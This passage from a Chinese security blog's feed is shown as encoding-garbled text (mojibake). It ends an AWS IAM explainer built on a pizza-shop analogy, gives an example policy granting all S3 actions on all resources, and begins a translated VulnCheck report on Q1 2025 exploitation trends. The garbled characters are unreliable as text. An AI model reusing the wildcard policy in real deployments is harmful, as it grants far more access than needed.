æ¡¶æœ¬èº«ï¼ˆæ³¨æ„ï¼šä¸æ˜¯å¯¹è±¡ï¼‰ï¼Œ<code>arn:aws:s3:::bucket-name/*</code>è¡¨ç¤ºæ¡¶ä¸­æ‰€æœ‰çš„å¯¹è±¡ï¼ˆæ³¨æ„ï¼š<code>/*</code> è¡¨ç¤ºæ¡¶å†…å¯¹è±¡ï¼‰ï¼›</li></ul><h2 id="0x04-ç¤ºä¾‹åœºæ™¯ï¼šæŠ«è¨åº—"><a href="#0x04-ç¤ºä¾‹åœºæ™¯ï¼šæŠ«è¨åº—" class="headerlink" title="0x04  ç¤ºä¾‹åœºæ™¯ï¼šæŠ«è¨åº—"></a>0x04  ç¤ºä¾‹åœºæ™¯ï¼šæŠ«è¨åº—</h2><p>ä»¥ä¸€å®¶æŠ«è¨åº—ä¸ºä¾‹ã€‚æŠ«è¨åº—ä¼šæœ‰ä¸€äº›<strong>å…¨èŒå‘˜å·¥</strong>ï¼Œæ¯”å¦‚<strong>å¨å¸ˆ</strong>ã€<strong>æœåŠ¡å‘˜</strong>å’Œ<strong>æ¸…æ´å·¥</strong>ã€‚ä¹Ÿå¯èƒ½æœ‰ä¸€äº›<strong>å…¼èŒå¨å¸ˆ</strong>åœ¨æ™šä¸Šå’Œå‘¨æœ«çš„é«˜å³°æ—¶æ®µå¸®å¿™ã€‚å¦‚æœè¿™å®¶åº—ç”Ÿæ„ä¸é”™ï¼Œå®ƒè¿˜ä¼šæœ‰å ‚é£Ÿå’Œå¤–å¸¦çš„<strong>é¡¾å®¢</strong>ã€‚</p><p><img src="/image/image_RnB_rOq7MC.png"></p><p>ä¸ AWS IAM ç±»ä¼¼ï¼Œ<strong>å…¨èŒå‘˜å·¥å°±åƒ IAM ç”¨æˆ·</strong>ã€‚ä»–ä»¬éœ€è¦é•¿æœŸè®¿é—®é¤å…çš„èµ„æºï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚<strong>è¿™äº›ç”¨æˆ·éƒ½å±äºä¸åŒçš„ç”¨æˆ·ç»„</strong>â€”â€”æœåŠ¡å‘˜ã€å¨å¸ˆå’Œæ¸…æ´å·¥ç»„ï¼ˆä¾‹å¦‚ï¼Œæ‰€æœ‰æœåŠ¡å‘˜çš„èŒç§°éƒ½ä¸ºâ€œæœåŠ¡å‘˜â€ï¼‰ã€‚</p><p><img src="/image/image_ORELz7gZHn.png"></p><p><strong>é¤å…å‘˜å·¥çš„èº«ä»½æ˜¯å¦‚ä½•éªŒè¯çš„å‘¢ï¼Ÿ<strong>å³æˆ‘ä»¬å¦‚ä½•ç¡®è®¤ä»–ä»¬çš„èº«ä»½å‘¢ï¼Ÿå…¶å®åªè¦æœ‰å¸¦æœ‰ç…§ç‰‡çš„</strong>å·¥ç‰Œ</strong>å°±å¯ä»¥äº†ã€‚å·¥ç‰Œä¸Šè¿˜å¯ä»¥æ˜¾ç¤ºä»–ä»¬çš„èŒç§°ï¼Œè¿™ä¸ä»–ä»¬æ‰€å±çš„ IAM ç»„ç±»ä¼¼ã€‚</p><p>æƒé™ç­–ç•¥å®šä¹‰äº†é¤å…å‘˜å·¥å¯ä»¥è®¿é—®å“ªäº›èµ„æºï¼Œè¿™äº›æƒé™ç­–ç•¥æ˜¯åœ¨ç»„çº§åˆ«åº”ç”¨çš„ï¼Œå› ä¸ºæ¯ä¸ªæœåŠ¡å‘˜ã€å¨å¸ˆå’Œæ¸…æ´å·¥éƒ½æ‹¥æœ‰ç›¸åŒçš„æƒé™ã€‚å®é™…æƒ…å†µå¯èƒ½å¹¶éå¦‚æ­¤ï¼Œä¾‹å¦‚ä¸»å¨å¯èƒ½æ‹¥æœ‰ç‰¹æƒè®¿é—®æƒé™ã€‚ä½†ä¸ºäº†ç®€å•èµ·è§ï¼Œæˆ‘ä»¬å‡è®¾æƒ…å†µç¡®å®å¦‚æ­¤ã€‚</p><p><strong>é¤å…ç»ç†å¦‚ä½•æ§åˆ¶è°æœ‰æƒè®¿é—®å“ªäº›èµ„æºå‘¢ï¼Ÿ</strong> åªè¦æœ‰å¸¦é”çš„é—¨å°±è¶³å¤Ÿäº†ã€‚<strong>é’¥åŒ™</strong>ä½œä¸ºä¸€ç§ç­–ç•¥ï¼Œæ§åˆ¶ç€é¤å…å„ä¸ªåŒºåŸŸçš„è®¿é—®æƒé™ã€‚æ‰€æœ‰æœåŠ¡å‘˜éƒ½å°†è·å¾—ä¸€å¥—ç›¸åŒçš„æƒé™é›†åˆï¼Œå› ä¸ºæœåŠ¡å‘˜éœ€è¦ç›¸åŒçº§åˆ«çš„æƒé™è¿›å…¥é£Ÿç‰©&#x2F;é¥®æ–™å‚¨è—å®¤ã€å¨æˆ¿å’Œå°±é¤åŒºçš„æƒåˆ©ã€‚åŒæ ·çš„é€»è¾‘ä¹Ÿé€‚ç”¨äºå…¶ä»–å…¨èŒå‘˜å·¥ï¼Œä»–ä»¬ä¼šæ”¶åˆ°ç›¸åº”çš„é’¥åŒ™ï¼Œä»¥ä¾¿å¯ä»¥æ ¹æ®éœ€è¦ä½¿ç”¨é¤å…çš„èµ„æºã€‚</p><p><strong>å‘é¤å…å‘˜å·¥å‘æ”¾é’¥åŒ™ç±»ä¼¼äºå°†ç­–ç•¥é™„åŠ åˆ° IAM ç”¨æˆ·æˆ–ç»„</strong>ã€‚æ²¡æœ‰é’¥åŒ™ï¼Œå‘˜å·¥å°±æ— æ³•è¿›å…¥é¤å…çš„æŸäº›åŒºåŸŸã€‚</p><p>åŒæ ·ï¼Œåœ¨ AWS ä¸­ï¼Œå¦‚æœæ²¡æœ‰æ˜ç¡®å…è®¸æ“ä½œçš„ç­–ç•¥ï¼Œå°±æ— æ³•å‘ AWS èµ„æºå‘å‡ºè¯·æ±‚ã€‚åœ¨ AWS å’Œæˆ‘ä»¬çš„é¤å…ç±»æ¯”ä¸­ï¼Œé»˜è®¤çŠ¶æ€éƒ½æ˜¯åœ¨å°è¯•è®¿é—®èµ„æºæ—¶éšå¼æ‹’ç»ã€‚</p><p><strong>å…¼èŒå‘˜å·¥</strong>ï¼ˆä¾‹å¦‚ä¸´æ—¶å¨å¸ˆï¼‰å’Œå®¢æˆ·ä¸éœ€è¦é•¿æœŸè®¿é—®èµ„æºï¼Œä½†éœ€è¦<strong>çŸ­æœŸè®¿é—®</strong>ï¼Œç±»ä¼¼äº <strong>IAM è§’è‰²</strong>ã€‚</p><p>å…¼èŒå‘˜å·¥åªèƒ½åœ¨å¾ˆçŸ­çš„æ—¶é—´æ®µå·¥ä½œï¼Œæ¯”å¦‚å‘¨æœ«æ™šä¸Šã€‚åœ¨æ­¤æ—¶é—´æ®µä¹‹å¤–ï¼Œä»–ä»¬æ— æƒä½¿ç”¨é¤å…çš„èµ„æºã€‚è¿™ä¸ªå…¼èŒå¨å¸ˆä¸ä¸€å®šæ˜¯åŒä¸€ä¸ªäººï¼Œå¯ä»¥æ¯å‘¨éƒ½æ¢äººï¼Œä¸åƒå…¨èŒå‘˜å·¥é‚£æ ·æœ‰ç‰¹å®šçš„èº«ä»½ã€‚</p><p>å› æ­¤ï¼Œ<strong>å…¼èŒå¨å¸ˆ</strong>å°†æ‰¿æ‹…å¨å¸ˆçš„è§’è‰²ï¼Œå¹¶è·å¾—ä¸€ä¸ª<strong>ä¸´æ—¶å¾½ç« </strong>ï¼Œè¯¥å¾½ç« åœ¨å…¶<strong>è½®ç­æœŸé—´æœ‰æ•ˆ</strong>ã€‚è¿™ç±»ä¼¼äº<strong>ä¸€ä¸ªå®ä½“æ‰¿æ‹…ä¸€ä¸ªé™„åŠ äº†ç­–ç•¥çš„ IAM è§’è‰²ï¼Œå¹¶è·å¾—ä¸´æ—¶å®‰å…¨å‡­è¯ï¼Œè¯¥å‡­è¯å°†åœ¨ä¸€æ®µæ—¶é—´åè¿‡æœŸ</strong>ã€‚è¿™é‡Œçš„ç­–ç•¥æ˜¯æˆäºˆé¤å…éƒ¨åˆ†æƒé™çš„ä¸€ç»„å¯†é’¥ï¼Œè€Œ<strong>ä¸´æ—¶å®‰å…¨å‡­è¯</strong>æ˜¯ç”¨äºéªŒè¯å¨å¸ˆèº«ä»½çš„<strong>ä¸´æ—¶å¾½ç« </strong>ã€‚</p><p>åŒæ ·ï¼Œé¡¾å®¢ä¸ IAM è§’è‰²ç±»ä¼¼ï¼ŒåŸå› æœ‰äºŒã€‚é¦–å…ˆï¼Œä»–ä»¬åªéœ€è¦é¤å…çš„ä¸´æ—¶è®¿é—®æƒé™ã€‚å…¶æ¬¡ï¼Œæˆ–è®¸æ›´é‡è¦çš„æ˜¯ï¼Œä¸€å®¶æˆåŠŸçš„é¤å…åœ¨å…¶æ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…å°†æ‹¥æœ‰æ•°ä¸‡åˆ°æ•°åä¸‡çš„ç‹¬ç«‹é¡¾å®¢ã€‚</p><p>æ‹¥æœ‰å¤§é‡æœªè¯†åˆ«å®ä½“æ˜¯ IAM è§’è‰²çš„ç†æƒ³ä½¿ç”¨åœºæ™¯ã€‚å›æƒ³ä¸€ä¸‹ï¼ŒAWS å¯¹ IAM ç”¨æˆ·æ•°é‡çš„ç¡¬æ€§é™åˆ¶æ˜¯ <strong>5000</strong>ã€‚å¦‚æœæŸä¸ªç”¨ä¾‹æ‰€éœ€çš„ IAM ç”¨æˆ·æ•°é‡è¶…è¿‡æ­¤ 5000 ä¸ªé™åˆ¶ï¼Œé‚£ä¹ˆä½¿ç”¨ IAM è§’è‰²æ˜¯æ‚¨å”¯ä¸€çš„é€‰æ‹©ã€‚</p><p>å°±åƒ IAM è§’è‰²çš„æ‰¿æ‹…æ–¹å¼ä¸€æ ·ï¼Œå®¢æˆ·é¦–å…ˆéœ€è¦è®¢è´­æŸäº›ä¸œè¥¿æ¥è¯æ˜ä»–ä»¬æ˜¯å®¢æˆ·å¹¶ä¸”å¯ä»¥æ‰¿æ‹…å®¢æˆ·çš„è§’è‰²ã€‚<strong>æ‰¿æ‹…é¡¾å®¢è§’è‰²åï¼Œé™„åŠ åˆ°è¯¥é¡¾å®¢è§’è‰²çš„æƒé™ç­–ç•¥ä¹Ÿå°†åº”ç”¨äºé¡¾å®¢ã€‚</strong> é¡¾å®¢ä»…æ‹¥æœ‰ä½¿ç”¨éƒ¨åˆ†èµ„æºçš„æƒé™ï¼Œä¾‹å¦‚å°±é¤åŒºå’Œå«ç”Ÿé—´ã€‚</p><p>ä¸ºäº†ä½¿è¿™ä¸ªç±»æ¯”æ›´è´´è¿‘ç°å®ï¼Œæˆ‘ä»¬å‡è®¾å•æ‰€çš„è®¿é—®æ˜¯é€šè¿‡è¾“å…¥ä¸€ä¸ªæ¯å¤©æ›´æ–°çš„å¯†ç æ¥æ§åˆ¶çš„ï¼Œä»è€Œç¡®ä¿è®¿é—®æƒé™æ˜¯æš‚æ—¶çš„ã€‚<strong>è¿™ä¸ªå¯†ç ç±»ä¼¼äºé™„åŠ åˆ°å®¢æˆ·è§’è‰²çš„ã€æˆäºˆä¸´æ—¶è®¿é—®å•æ‰€æƒé™çš„ç­–ç•¥</strong>ã€‚</p><p><img src="/image/image_hYcmZIh9vK.png"></p><h2 id="0x05-ç¤ºä¾‹åœºæ™¯ï¼šEC2-è®¿é—®-S3"><a href="#0x05-ç¤ºä¾‹åœºæ™¯ï¼šEC2-è®¿é—®-S3" class="headerlink" title="0x05 ç¤ºä¾‹åœºæ™¯ï¼šEC2 è®¿é—® S3"></a>0x05 ç¤ºä¾‹åœºæ™¯ï¼šEC2 è®¿é—® S3</h2><p>å¦‚æœä½ æœ‰ä¸€å° EC2 å®ä¾‹éœ€è¦è®¿é—® S3 æ¡¶ï¼Œé‚£ä¹ˆå¦‚ä½•æˆäºˆ EC2 å®ä¾‹ä» S3 å­˜å‚¨æ¡¶è¯»å–å’Œå†™å…¥å¯¹è±¡çš„æƒé™ï¼Ÿ</p><p><img src="/image/image_-JViA50Gr9.png"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸»è¦çš„æ­¥éª¤æœ‰ï¼š</p><ol><li>ä¸º EC2 å®ä¾‹åˆ›å»º IAM è§’è‰²ï¼›</li><li>å°† IAM ç­–ç•¥é™„åŠ åˆ°æˆäºˆ S3 å­˜å‚¨æ¡¶å®Œå…¨è®¿é—®æƒé™çš„è§’è‰²ä¸Šï¼›</li><li>è®© EC2 å®ä¾‹æ‰¿æ‹…è§’è‰²ã€‚</li></ol><p>å…¶ä¸­ï¼Œç¬¬äºŒä¸ªæ­¥éª¤ä¸­çš„ IAM ç­–ç•¥æ˜¯ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;s3:*&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;s3-object-lambda:*&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹ S3 å­˜å‚¨æ¡¶è¿›è¡Œè¯»å†™æ“ä½œäº†ã€‚è¯·æ³¨æ„ï¼Œä¸Šé¢çš„ç­–ç•¥æ²¡æœ‰æŒ‡å®šä»»ä½• ARNï¼Œåªæ˜¯ä¸ºèµ„æºæŒ‡å®šæ¥<code>*</code>ï¼Œè¿™æ„å‘³ç€å¯å¯¹æ‰€æœ‰ S3 å­˜å‚¨æ¡¶è¿›è¡Œè¯»å†™æ“ä½œã€‚ä½†æ˜¯ï¼Œå¦‚æœæƒ³æŒ‡å®šå•ä¸ªå­˜å‚¨æ¡¶ï¼Œé‚£ä¹ˆå°±éœ€è¦æä¾›è¯¥å­˜å‚¨æ¡¶çš„ ARNã€‚</p><h2 id="0x06-æ€»ç»“"><a href="#0x06-æ€»ç»“" class="headerlink" title="0x06 æ€»ç»“"></a>0x06 æ€»ç»“</h2><p>ç†è§£ IAM ä¸­çš„ç”¨æˆ·ã€è§’è‰²ã€ç”¨æˆ·ç»„ä»¥åŠç­–ç•¥çš„è¿ä½œæœºåˆ¶ï¼Œæ˜¯ä½ åœ¨ AWS ä¸Šè®¾è®¡å®‰å…¨è§£å†³æ–¹æ¡ˆçš„åšå®åŸºç¡€ã€‚</p><p><img src="/image/image_84E9xYtKjN.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>AWS å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025 å¹´ç¬¬ä¸€å­£åº¦æ¼æ´åˆ©ç”¨è¶‹åŠ¿</title>
    <link href="/2025/04/28/2025-%E5%B9%B4%E7%AC%AC%E4%B8%80%E5%AD%A3%E5%BA%A6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%B6%8B%E5%8A%BF/"/>
    <url>/2025/04/28/2025-%E5%B9%B4%E7%AC%AC%E4%B8%80%E5%AD%A3%E5%BA%A6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%B6%8B%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<p>å·²çŸ¥è¢«åˆ©ç”¨æ¼æ´ï¼ˆKnown Exploited Vulnerabilitiesï¼Œæœ¬æ–‡ç®€ç§° KEVï¼‰æŒ‡çš„æ˜¯å·²ç»è¢«è¯å®åœ¨ç°å®ä¸­è¢«æ”»å‡»è€…åˆ©ç”¨è¿‡çš„æ¼æ´ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ç±»æ¼æ´ä¸ä»…å­˜åœ¨ç†è®ºä¸Šçš„é£é™©ï¼Œè€Œæ˜¯å·²ç»æœ‰å®é™…æ”»å‡»æ¡ˆä¾‹ï¼Œåœ¨é‡ï¼ˆin the wildï¼‰è¢«åˆ©ç”¨è¿‡ã€‚</p><p>ç¾å›½ CISAï¼ˆç½‘ç»œå®‰å…¨ä¸åŸºç¡€è®¾æ–½å®‰å…¨å±€ï¼‰å°±æœ‰ä¸€ä¸ªå« <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities Catalogï¼ˆå·²çŸ¥è¢«åˆ©ç”¨æ¼æ´ç›®å½•ï¼‰">Known Exploited Vulnerabilities Catalogï¼ˆå·²çŸ¥è¢«åˆ©ç”¨æ¼æ´ç›®å½•ï¼‰</a>çš„å®˜æ–¹é¡¹ç›®ã€‚ä¸ºäº†é€ ç¦ç½‘ç»œå®‰å…¨ç¤¾åŒºå’Œç½‘ç»œé˜²å¾¡è€…ï¼Œå¹¶å¸®åŠ©æ¯ä¸ªç»„ç»‡æ›´å¥½åœ°ç®¡ç†æ¼æ´å¹¶è·Ÿä¸Šå¨èƒæ´»åŠ¨çš„æ­¥ä¼ï¼ŒCISA ç»´æŠ¤ç€å·²è¢«åˆ©ç”¨çš„æ¼æ´çš„æƒå¨æ¥æºã€‚ç»„ç»‡åº”å°† KEV ç›®å½•ä½œä¸ºå…¶æ¼æ´ç®¡ç†ä¼˜å…ˆçº§æ’åºæ¡†æ¶çš„è¾“å…¥ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://vulncheck.com/blog/exploitation-trends-q1-2025" title="https:&#x2F;&#x2F;vulncheck.com&#x2F;blog&#x2F;exploitation-trends-q1-2025">https://vulncheck.com/blog/exploitation-trends-q1-2025</a></p><h2 id="0x00-æ¦‚è¿°"><a href="#0x00-æ¦‚è¿°" class="headerlink" title="0x00 æ¦‚è¿°"></a>0x00 æ¦‚è¿°</h2><p>åœ¨ 2025 å¹´ç¬¬ä¸€å­£åº¦ï¼ŒVulnCheck é¦–æ¬¡è¯†åˆ«å‡º 159 ä¸ª CVE è¢«å…¬å¼€æŠ«éœ²ä¸ºåœ¨é‡å¤–è¢«åˆ©ç”¨çš„è¯æ®ã€‚è¿™äº› KEV çš„æŠ«éœ²æ¥è‡ª 50 ä¸ªä¸åŒçš„æ¥æºã€‚</p><p>æˆ‘ä»¬ç»§ç»­è§‚å¯Ÿåˆ°æ¼æ´è¢«è¿…é€Ÿåˆ©ç”¨çš„è¶‹åŠ¿ï¼Œå…¶ä¸­ 28.3% çš„æ¼æ´åœ¨ CVE æŠ«éœ²åçš„ 1 å¤©å†…å³è¢«åˆ©ç”¨ã€‚è¿™ä¸€è¶‹åŠ¿å»¶ç»­äº† 2024 å¹´è§‚å¯Ÿåˆ°çš„èŠ‚å¥ã€‚</p><p>è¿™è¡¨æ˜é˜²å¾¡è€…éœ€è¦åœ¨åº”å¯¹æ–°å…´å¨èƒæ—¶è¡ŒåŠ¨è¿…é€Ÿï¼ŒåŒæ—¶æŒç»­å‡å°‘è‡ªå·±çš„æ¼æ´å€ºåŠ¡ã€‚</p><h2 id="0x01-å…³é”®ç‚¹"><a href="#0x01-å…³é”®ç‚¹" class="headerlink" title="0x01 å…³é”®ç‚¹"></a>0x01 å…³é”®ç‚¹</h2><ul><li>2025 å¹´ç¬¬ä¸€å­£åº¦ï¼Œå…±æœ‰ 159 ä¸ª KEV è¢«å…¬å¼€æŠ«éœ²ï¼›</li><li>28.3% çš„ KEV åœ¨ CVE å‘å¸ƒåä¸åˆ°ä¸€å¤©å†…å°±æœ‰è¢«åˆ©ç”¨çš„è¯æ®ï¼›</li><li>25.8% çš„ KEV ä»åœ¨ç­‰å¾…æˆ–æ¥å— NIST NVD çš„åˆ†æï¼›</li><li>3.1% çš„ KEV è¢« NIST NVD åˆ†é…äº†æ–°çš„â€œå»¶æœŸï¼ˆDeferredï¼‰â€çŠ¶æ€ï¼›</li><li>2 ä¸ªå…¬å¼€æŠ¥å‘Šçš„ KEV æ‹¥æœ‰ä¿ç•™ä½†æœªå‘å¸ƒçš„ CVE ç¼–å·ï¼›</li><li>1 ä¸ªæŠ¥å‘Šçš„ KEV ç°å·²è¢«æ‹’ç»ã€‚</li></ul><h2 id="0x02-ç±»åˆ«è¶‹åŠ¿"><a href="#0x02-ç±»åˆ«è¶‹åŠ¿" class="headerlink" title="0x02 ç±»åˆ«è¶‹åŠ¿"></a>0x02 ç±»åˆ«è¶‹åŠ¿</h2><p><img src="/image/686.webp" alt="å›¾ 1ï¼šå“ªäº›äº§å“ç±»åˆ«ã€å‚å•†å’Œäº§å“è¢«æŠ¥å‘Šä¸ºå­˜åœ¨æ¼æ´åˆ©ç”¨ï¼Ÿ"></p><p>2025 å¹´ç¬¬ä¸€å­£åº¦ä¸æ–° KEV ç›¸å…³çš„å‰äº”å¤§ç±»åˆ«ä¸ºï¼š</p><ul><li>å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰ï¼ˆ35 é¡¹ï¼‰</li><li>ç½‘ç»œè¾¹ç¼˜è®¾å¤‡ï¼ˆ29 é¡¹ï¼‰</li><li>æ“ä½œç³»ç»Ÿï¼ˆ24 é¡¹ï¼‰</li><li>å¼€æºè½¯ä»¶ï¼ˆ14 é¡¹ï¼‰</li><li>æœåŠ¡å™¨è½¯ä»¶ï¼ˆ14 é¡¹ï¼‰</li></ul><p>è¿™äº›ç±»åˆ«é€šå¸¸æ¶‰åŠé¢å‘äº’è”ç½‘æˆ–ç»ˆç«¯ç”¨æˆ·å¯è®¿é—®çš„ç³»ç»Ÿã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸å†å²ä¸Šæ¡Œé¢åº”ç”¨ç¨‹åºå’Œæµè§ˆå™¨å¸¸è¢«åˆ©ç”¨çš„æƒ…å†µç›¸æ¯”ï¼Œæ¡Œé¢åº”ç”¨ç¨‹åºå’Œæµè§ˆå™¨ç›¸å…³çš„ KEV æ•°é‡ç›¸å¯¹è¾ƒä½ã€‚æœªæ¥å‡ ä¸ªå­£åº¦ï¼Œè¿™ç§å˜åŒ–æ˜¯å¦ä¼šæŒç»­ï¼Œå€¼å¾—å…³æ³¨ã€‚</p><p>ä¸»è¦å—å½±å“çš„å‚å•†å’Œäº§å“åŒ…æ‹¬ï¼š</p><ul><li>Microsoft Windowsï¼ˆ15 é¡¹ï¼‰</li><li>Broadcom VMwareï¼ˆ6 é¡¹ï¼‰</li><li>Cyber PowerPanelï¼ˆ5 é¡¹ï¼‰</li><li>Litespeed Technologiesï¼ˆ4 é¡¹ï¼‰</li><li>Totolink è·¯ç”±å™¨ï¼ˆ4 é¡¹ï¼‰</li></ul><h2 id="0x03-æ¯æœˆè¶‹åŠ¿"><a href="#0x03-æ¯æœˆè¶‹åŠ¿" class="headerlink" title="0x03 æ¯æœˆè¶‹åŠ¿"></a>0x03 æ¯æœˆè¶‹åŠ¿</h2><p><img src="/image/687.png" alt="å›¾ 2ï¼šæ¼æ´åˆ©ç”¨è¯æ®è¢«æŠ¥å‘Šçš„é€Ÿåº¦å¦‚ä½•ï¼Ÿ"></p><p>å½“æˆ‘ä»¬è§‚å¯Ÿ CVE æŠ«éœ²åˆ°åˆ©ç”¨è¯æ®å…¬å¼€ä¹‹é—´çš„æ—¶é—´æ—¶ï¼Œå¯ä»¥æ›´å¥½åœ°ç†è§£æ¼æ´è¢«åˆ©ç”¨çš„é€Ÿåº¦ã€‚æˆ‘ä»¬å‘ç°ï¼Œ28.3% çš„ KEV åœ¨ CVE å‘å¸ƒåä¸åˆ°ä¸€å¤©å³è¢«æŠ«éœ²å­˜åœ¨åˆ©ç”¨è¯æ®ã€‚è¿˜æœ‰ 2 ä¸ª KEV ä»å¤„äºä¿ç•™çŠ¶æ€ï¼Œ1 ä¸ªå·²è¢«æ‹’ç»ã€‚æ•´ä½“ä¸Šï¼Œè¿™ä¸€é€Ÿåº¦æ¯” 2024 å¹´ç¨å¿«ï¼Œè¯´æ˜å¨èƒè¡Œä¸ºè€…åœ¨æ–°æ¼æ´ä¸Šè¡ŒåŠ¨æ›´åŠ è¿…é€Ÿã€‚</p><h2 id="0x04-æ¯å‘¨-æ¯æœˆè¶‹åŠ¿"><a href="#0x04-æ¯å‘¨-æ¯æœˆè¶‹åŠ¿" class="headerlink" title="0x04 æ¯å‘¨&#x2F;æ¯æœˆè¶‹åŠ¿"></a>0x04 æ¯å‘¨&#x2F;æ¯æœˆè¶‹åŠ¿</h2><p><img src="/image/688.png" alt="å›¾ 3ï¼šæ¯å‘¨&#x2F;æ¯æœˆé¦–æ¬¡æŠ¥å‘Šè¢«åˆ©ç”¨çš„æ¼æ´æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ"></p><p>è™½ç„¶å¹´åˆå¼€å§‹æ—¶æ¼æ´æŠ«éœ²é€Ÿåº¦è¾ƒæ…¢ï¼ˆå¯èƒ½æ˜¯å­£èŠ‚æ€§åŸå› ï¼‰ï¼Œä½†åœ¨å­£åº¦ååŠæ®µè¿…é€ŸåŠ é€Ÿï¼Œæœ€ç»ˆåœ¨ 2025 å¹´ç¬¬ä¸€å­£åº¦ç´¯è®¡æŠ¥å‘Šäº† 159 ä¸ªå·²çŸ¥è¢«åˆ©ç”¨æ¼æ´ï¼ˆKEVï¼‰ã€‚å¹³å‡æ¯å‘¨æŠ«éœ² 11.4 ä¸ªï¼Œæ¯æœˆæŠ«éœ² 53 ä¸ªã€‚è™½ç„¶ CISA KEV åœ¨è¿™ä¸€å­£åº¦å¢åŠ äº† 73 ä¸ªæ¼æ´ï¼Œä½†å…¶ä¸­åªæœ‰ 12 ä¸ªæ­¤å‰æ²¡æœ‰å…¬å¼€çš„åˆ©ç”¨è¯æ®ã€‚</p><p>å¯¹äºé˜²å¾¡è€…æ¥è¯´ï¼Œè¿™ä¸€è¶‹åŠ¿ä¸ºå›´ç»•æ–°å…´æ¼æ´å¨èƒçš„èƒ½åŠ›è§„åˆ’æä¾›äº†æœ‰ä»·å€¼çš„å‚è€ƒã€‚</p><h2 id="0x05-æ¥æºåˆ†å¸ƒ"><a href="#0x05-æ¥æºåˆ†å¸ƒ" class="headerlink" title="0x05 æ¥æºåˆ†å¸ƒ"></a>0x05 æ¥æºåˆ†å¸ƒ</h2><p><img src="/image/689.png" alt="å›¾ 4ï¼šè°æ˜¯æœ€æ—©å…¬å¼€æŠ¥å‘Šæ¼æ´åˆ©ç”¨çš„äººï¼Ÿ"></p><p>2025 å¹´ç¬¬ä¸€å­£åº¦ï¼Œæœ‰ 159 ä¸ªæ¼æ´çš„åˆ©ç”¨è¯æ®æ¥è‡ª 50 ä¸ªä¸åŒç»„ç»‡ã€‚æ•°æ®æ˜¾ç¤ºï¼Œè¿™äº›æŠ«éœ²å‘ˆç°å‡ºé•¿å°¾åˆ†å¸ƒï¼Œè¿™å¯¹äºå¯»æ‰¾å¯æ“ä½œå¨èƒæƒ…æŠ¥çš„é˜²å¾¡è€…æ¥è¯´æ˜¯ä¸€ä¸ªæœ‰ä»·å€¼çš„è¶‹åŠ¿ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œ2024 å¹´ç¬¬å››å­£åº¦æœ‰ 190 ä¸ªä¸ CVE ç›¸å…³çš„æ¼æ´åˆ©ç”¨æŠ«éœ²ï¼Œä¸è¿‡å…¶ä¸­ 39 ä¸ªæ˜¯æ­¤å‰å·²çŸ¥çš„è€æ—§ WordPress æ¼æ´ï¼Œåç»ä¸ Wordfence åè°ƒåˆ†é…äº† CVE ç¼–å·å¹¶æ­£å¼å‘å¸ƒï¼Œå› æ­¤å¤¸å¤§äº† Q4 çš„æ€»æ•°ã€‚å¦‚æœæ’é™¤è¿™äº›ï¼Œè°ƒæ•´åçš„æ•°å­—æ˜¯ 151ã€‚</p><p>åœ¨å…¬å¼€æŠ«éœ²æ¼æ´åˆ©ç”¨è¯æ®æ–¹é¢çš„ä¸»è¦è´¡çŒ®è€…åŒ…æ‹¬ï¼š</p><ul><li>Shadow Serverï¼ˆ31 é¡¹ï¼‰</li><li>GreyNoiseï¼ˆ17 é¡¹ï¼‰</li><li>CISA KEVï¼ˆ12 é¡¹ï¼‰</li><li>Microsoftï¼ˆ12 é¡¹ï¼‰</li><li>Sentinel Oneï¼ˆ10 é¡¹ï¼‰</li><li>Cybleï¼ˆ9 é¡¹ï¼‰</li><li>Patchstackï¼ˆ6 é¡¹ï¼‰</li><li>Secure Listï¼ˆ5 é¡¹ï¼‰</li></ul><h2 id="0x06-NVD-çŠ¶æ€åˆ†æ"><a href="#0x06-NVD-çŠ¶æ€åˆ†æ" class="headerlink" title="0x06 NVD çŠ¶æ€åˆ†æ"></a>0x06 NVD çŠ¶æ€åˆ†æ</h2><p><img src="/image/690.webp" alt="å›¾ 5:2025 å¹´ç¬¬ä¸€å­£åº¦ KEV çš„å½“å‰ NVD&#x2F;CVE çŠ¶æ€æ˜¯æ€æ 